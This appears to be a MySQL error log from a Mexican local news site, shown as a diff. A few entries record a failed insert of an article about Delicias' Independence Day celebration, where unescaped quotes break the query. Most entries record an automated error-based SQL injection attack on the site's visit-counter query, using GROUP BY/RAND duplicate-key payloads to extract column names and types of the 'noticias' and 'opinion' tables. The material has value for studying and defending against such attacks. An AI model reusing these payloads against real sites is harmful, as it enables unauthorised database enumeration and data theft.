@@ -1,0 +1,274 @@
+Time : 09:41:40
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'Grito de Independencia'','grito delicias.jpg','Ante miles de delicienses que se ' at line 1
+Raw SQL : CALL insertar('delicias','','titular1','Alcalde Compeán celebró el 'Grito de Independencia'','grito delicias.jpg','Ante miles de delicienses que se dieron cita en el Reloj Público, la noche de este sábado 15 de septiembre, el Presidente Municipal, Eliseo Compeán Fernández, celebró el 208 aniversario del inicio de la de Independencia de México. ','','Una vez que el Secretario del Ayuntamiento, Manuel Villanueva dio lectura al Acta de Independencia, el presidente Eliseo Compeán Fernández, llamó a los delicienses a la celebración.
+
+ 
+
+','','Al recordar a los insurgentes, Miguel Hidalgo, José María Morelos y Pavón, Josefa Ortiz de Domínguez, Ignacio Allende y Manuel Matamoros, los delicienses ondeando sus banderas, respondieron al unísono ¡Viva!, concluyendo con el tradicional ¡Viva México! en repetidas ocasiones.
+
+
+','','El espectáculo de pirotecnia sorprendió a las familias al iluminarse el cielo de colores por varios minutos, concluyendo de esta manera la conmemoración del 208 aniversario del inicio de la Independencia de México.','','','','')
+
+Time : 09:41:00
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'Grito de Independencia'','grito delicias.jpg','Ante miles de delicienses que se ' at line 1
+Raw SQL : CALL insertar('delicias','','titular1','Alcalde Compeán celebró el 'Grito de Independencia'','grito delicias.jpg','Ante miles de delicienses que se dieron cita en el Reloj Público, la noche de este sábado 15 de septiembre, el Presidente Municipal, Eliseo Compeán Fernández, celebró el 208 aniversario del inicio de la de Independencia de México. ','','Una vez que el Secretario del Ayuntamiento, Manuel Villanueva dio lectura al Acta de Independencia, el presidente Eliseo Compeán Fernández, llamó a los delicienses a la celebración.
+
+ 
+
+','','Al recordar a los insurgentes, Miguel Hidalgo, José María Morelos y Pavón, Josefa Ortiz de Domínguez, Ignacio Allende y Manuel Matamoros, los delicienses ondeando sus banderas, respondieron al unísono ¡Viva!, concluyendo con el tradicional ¡Viva México! en repetidas ocasiones.
+
+Los Honores a la Bandera, estuvieron a cargo de la banda de guerra y escolta del 66 Batallón de Infantería.
+
+','','El espectáculo de pirotecnia sorprendió a las familias al iluminarse el cielo de colores por varios minutos, concluyendo de esta manera la conmemoración del 208 aniversario del inicio de la Independencia de México.','','','','')
+
+Time : 09:17:16
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 07:06:23
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''A=0' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11182'A=0
+
+Time : 00:57:42
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq696E7428313129qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 3869 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_type AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6f70696e696f6e AND table_schema=0x64656c6264 LIMIT 6,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:42
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq7661726368617228343529qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 9061 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_type AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6f70696e696f6e AND table_schema=0x64656c6264 LIMIT 8,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:42
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq766172636861722831303029qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 6626 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_type AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6f70696e696f6e AND table_schema=0x64656c6264 LIMIT 5,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:41
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq696D6167656E6175746F72qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 6314 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_name AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6f70696e696f6e AND table_schema=0x64656c6264 LIMIT 5,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:41
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq6F70696E696F6E636F6Cqvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 4568 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_name AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6f70696e696f6e AND table_schema=0x64656c6264 LIMIT 8,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:41
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq76697369746173qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 4376 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_name AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6f70696e696f6e AND table_schema=0x64656c6264 LIMIT 6,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:41
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq7661726368617228343529qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 6952 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_type AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6f70696e696f6e AND table_schema=0x64656c6264 LIMIT 7,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:41
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq766172636861722831303029qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 8788 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_type AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6f70696e696f6e AND table_schema=0x64656c6264 LIMIT 2,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:41
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq74657874qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 2544 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_type AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6f70696e696f6e AND table_schema=0x64656c6264 LIMIT 3,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:41
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq766172636861722831303029qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 5942 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_type AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6f70696e696f6e AND table_schema=0x64656c6264 LIMIT 4,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:41
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq696E7428313129qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 2251 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_type AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6f70696e696f6e AND table_schema=0x64656c6264 LIMIT 0,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:41
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq6461746574696D65qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 7545 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_type AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6f70696e696f6e AND table_schema=0x64656c6264 LIMIT 1,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:40
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq63756572706Fqvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 4054 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_name AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6f70696e696f6e AND table_schema=0x64656c6264 LIMIT 3,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:40
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq746974756C6Fqvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 8005 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_name AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6f70696e696f6e AND table_schema=0x64656c6264 LIMIT 2,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:40
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq72756D626Fqvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 8025 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_name AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6f70696e696f6e AND table_schema=0x64656c6264 LIMIT 7,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:40
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq6175746F72qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 3594 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_name AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6f70696e696f6e AND table_schema=0x64656c6264 LIMIT 4,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:40
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq6964qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 4600 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_name AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6f70696e696f6e AND table_schema=0x64656c6264 LIMIT 0,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:40
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq64617465qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 5022 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_name AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6f70696e696f6e AND table_schema=0x64656c6264 LIMIT 1,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:39
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq39qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 1574 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT HEX(IFNULL(CAST(COUNT(*) AS CHAR),0x20)) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6f70696e696f6e AND table_schema=0x64656c6264),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:38
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq7661726368617228343529qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 6483 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_type AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e6f746963696173 AND table_schema=0x64656c6264 LIMIT 18,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:38
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq696E7428313129qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 3248 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_type AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e6f746963696173 AND table_schema=0x64656c6264 LIMIT 17,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:38
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq6D656469756D74657874qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 2903 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_type AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e6f746963696173 AND table_schema=0x64656c6264 LIMIT 16,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:37
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq766964656F74797065qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 7804 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_name AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e6f746963696173 AND table_schema=0x64656c6264 LIMIT 18,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:37
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq766172636861722832353029qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 3289 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_type AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e6f746963696173 AND table_schema=0x64656c6264 LIMIT 8,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:37
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq76697369746173qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 8299 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_name AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e6f746963696173 AND table_schema=0x64656c6264 LIMIT 17,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:37
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq766172636861722832353029qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 8310 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_type AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e6f746963696173 AND table_schema=0x64656c6264 LIMIT 14,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:37
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq6D656469756D74657874qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 6339 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_type AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e6f746963696173 AND table_schema=0x64656c6264 LIMIT 15,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:37
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq766964656Fqvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 9256 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_name AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e6f746963696173 AND table_schema=0x64656c6264 LIMIT 16,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:36
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq6D656469756D74657874qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 7022 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_type AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e6f746963696173 AND table_schema=0x64656c6264 LIMIT 13,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:36
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq6D656469756D74657874qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 2255 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_type AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e6f746963696173 AND table_schema=0x64656c6264 LIMIT 11,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:36
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq766172636861722832353029qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 5027 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_type AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e6f746963696173 AND table_schema=0x64656c6264 LIMIT 12,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:36
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq766172636861722832353029qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 5297 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_type AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e6f746963696173 AND table_schema=0x64656c6264 LIMIT 10,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:36
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq7661726368617228343529qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 7684 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_type AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e6f746963696173 AND table_schema=0x64656c6264 LIMIT 4,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:36
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq6D656469756D74657874qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 4000 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_type AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e6f746963696173 AND table_schema=0x64656c6264 LIMIT 9,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:36
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq766172636861722832353029qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 6243 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_type AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e6f746963696173 AND table_schema=0x64656c6264 LIMIT 5,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:36
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq7061727261666F35qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 8501 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_name AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e6f746963696173 AND table_schema=0x64656c6264 LIMIT 15,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:36
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq696D6167656E35qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 5244 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_name AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e6f746963696173 AND table_schema=0x64656c6264 LIMIT 14,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:36
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq7061727261666F34qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 9682 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_name AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e6f746963696173 AND table_schema=0x64656c6264 LIMIT 13,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:35
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq7061727261666F33qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 1695 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_name AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e6f746963696173 AND table_schema=0x64656c6264 LIMIT 11,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:35
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq696D6167656E34qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 7094 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_name AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e6f746963696173 AND table_schema=0x64656c6264 LIMIT 12,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:35
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qxpjq696D6167656E33qvzqq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10543 AND (SELECT 9622 FROM(SELECT COUNT(*),CONCAT(0x7178706a71,(SELECT MID((HEX(IFNULL(CAST(column_name AS CHAR),0x20))),1,50) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e6f746963696173 AND table_schema=0x64656c6264 LIMIT 10,1),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Time : 00:57:35
